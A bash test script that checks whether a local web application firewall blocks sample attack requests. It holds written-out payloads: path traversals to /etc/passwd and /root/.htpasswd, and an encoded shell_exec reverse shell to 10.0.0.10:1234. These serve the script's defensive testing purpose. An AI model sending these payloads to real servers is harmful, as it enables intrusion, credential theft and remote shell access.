#/bin/bash
echo "[ ] Checking if our WAF is up."
I=1
N=20
while [ "$I" -le "$N" ]; do	
	http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=HelloWorld" -s -f -w %{http_code} -m 1 -o /dev/null)
	if (($http_code == 404)); then 
	echo "    [+] We got a $http_code. This is correct since we dont host any files.";
		break
  	fi
	echo "    [!] We got a $http_code. Our WAF seems to be down. Check $I out of $N"; 
	I=$(($I + 1))
	sleep 0.5
	if (($I == $N)); then
		echo "[!] Check counter $I out of $N. Killing test."; 		
		exit 10; 
	fi	
done
echo "[x] Our WAF is up!"; 
echo "[ ] Running WAF Tests"
echo "    [ ] Path Traversal"
path_traversal01_http_code=$(curl "http://localhost:81/SomeFile.pl?SomeParam=../../../etc/passwd" -s -f -w %{http_code} -m 10 -o /dev/null)
if (($path_traversal01_http_code == 403)); then 
	echo "        [+] Path Traversal - We got a $path_traversal01_http_code on Path Traversal #01." ; 
else 
	echo "        [!] Path Traversal - We got a $path_traversal01_http_code on Path Traversal #01.";
	echo "[!] Path Traversal - Our WAF did NOT block all requests :("; 
	exit 21; 
fi
path_traversal02_http_code=$(curl "http://localhost:81/SomeFile.asp?SomeParam=SomeValue" -H 'Cookie: PHPSESSID%3D%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2froot%2F%2ehtpasswd' -s -f -w %{http_code} -m 10 -o /dev/null)
if (($path_traversal02_http_code == 403)); then 
	echo "        [+] Path Traversal - We got a $path_traversal02_http_code on Path Traversal #02." ; 
else 
	echo "        [!] Path Traversal - We got a $path_traversal02_http_code on Path Traversal #02.";
	echo "[!] Path Traversal - Our WAF did NOT block all requests :("; 
	exit 22; 
fi
echo "    [x] Our WAF blocked all Path Traversal requests, Noice!"
echo "    [ ] Shell Exec"
shell_exec_http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=shell_exec%28%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.10%2F1234%200%3E%261%27%22%29" -s -f -w %{http_code} -m 10 -o /dev/null)
if (($shell_exec_http_code == 403)); then 
	echo "        [+] Shell Exec - We got a $shell_exec_http_code on Shell Exec #01.";
else 
	echo "        [!] Shell Exec - We got a $shell_exec_http_code on Shell Exec #01."; 
	echo "[!] Shell Exec - Our WAF did NOT block all requests :("; 
	exit 31; 
fi
echo "    [x] Our WAF blocked all Shell Exec requests, Noice!"
echo "[x] All WAF tests succeded!"
echo ""
echo ""